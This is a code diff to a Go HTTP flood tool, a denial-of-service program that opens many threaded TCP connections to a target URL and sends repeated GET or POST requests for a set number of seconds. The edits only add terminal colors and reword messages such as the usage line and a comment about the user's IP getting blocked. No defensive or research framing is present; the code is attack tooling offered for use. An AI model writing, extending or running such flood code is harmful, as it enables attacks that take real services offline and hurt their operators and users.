@@ -1,5 +1,4 @@
 
-
 package main
 
 import (
@@ -189,7 +188,7 @@ func flood() {
 			s, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
-			fmt.Println("\033[35m Connection timed out ") //When showing this message, it means ur ip got blocked or the target server down.
+			fmt.Println("Connection Down!!!") //When showing this message, it means ur ip got blocked or the target server down.
 		} else {
 			for i := 0; i < 100; i++ {
 				request := ""
@@ -208,14 +207,14 @@ func flood() {
 
 func main() {
 	if len(os.Args) != 6 {
-		fmt.Println("Post Mode will use header.txt as data")
-		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
-		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
+		fmt.Println("\033[35mPost Mode will use header.txt as data")
+		fmt.Println("\033[35mIf you are using linux please run 'ulimit -n 999999' first!!!")
+		fmt.Println("\033[36mUsage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
 		os.Exit(1)
 	}
 	u, err := url.Parse(os.Args[1])
 	if err != nil {
-		println("Please input a correct url")
+		println("\033[35mPlease input a correct url")
 	}
 	tmp := strings.Split(u.Host, ":")
 	host = tmp[0]
@@ -250,7 +249,7 @@ func main() {
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
 		go flood() // Start threads
-		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
+		fmt.Printf("\033[35m\rThreads [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
 	}
